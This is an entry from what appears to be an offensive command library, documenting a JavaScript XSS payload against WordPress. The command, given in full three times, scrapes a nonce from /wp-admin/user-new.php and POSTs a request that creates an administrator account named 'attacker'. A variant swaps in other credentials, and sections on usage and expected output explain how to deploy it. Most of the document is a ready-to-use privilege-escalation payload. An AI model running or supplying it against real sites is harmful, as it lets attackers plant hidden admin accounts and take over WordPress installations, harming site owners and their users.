---
id: cmd-wp-admin-ajax-935503
data: >-
  var ajaxRequest=new
  XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser"
  value="([^"\*?]*)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var
  nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";(ajaxRequest=new
  XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
tags:
  - wordpress
  - ajax
  - user-creation
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.651Z'
verified: false
validated: true
submitted: true
---
# wordpress-admin-user-creation-ajax

## Command

```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"\*?]*)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

## Description

This JavaScript command, executed in a browser context via XSS, fetches a WordPress nonce from /wp-admin/user-new.php using a synchronous GET request, extracts it with regex, and then sends a POST to create a new admin user 'attacker'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| requestURL | Endpoint for nonce and user creation (/wp-admin/user-new.php) | Yes |
| nonceRegex | Regex to match nonce value (/ser" value="([^"\*?]*)"/g) | Yes |
| params | Form data string for POST (action=createuser&...) | Yes |

## Examples

### Basic Usage

Execute in browser console on WordPress admin page:

```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"\*?]*)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

### Advanced Usage

Modify params for different user details:

```javascript
// Change user_login to 'hacker', role to 'administrator'
params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=hacker@evil.com&pass1=pass123&pass2=pass123&role=administrator";
```

## Expected Output

Successful execution results in a new WordPress user created with admin privileges. No console output; verify by checking the Users panel in WordPress admin. Network requests show 200 OK for POST.

## Related

- [[Related Procedure: Exploit-XSS-to-Create-WordPress-Admin-User]]
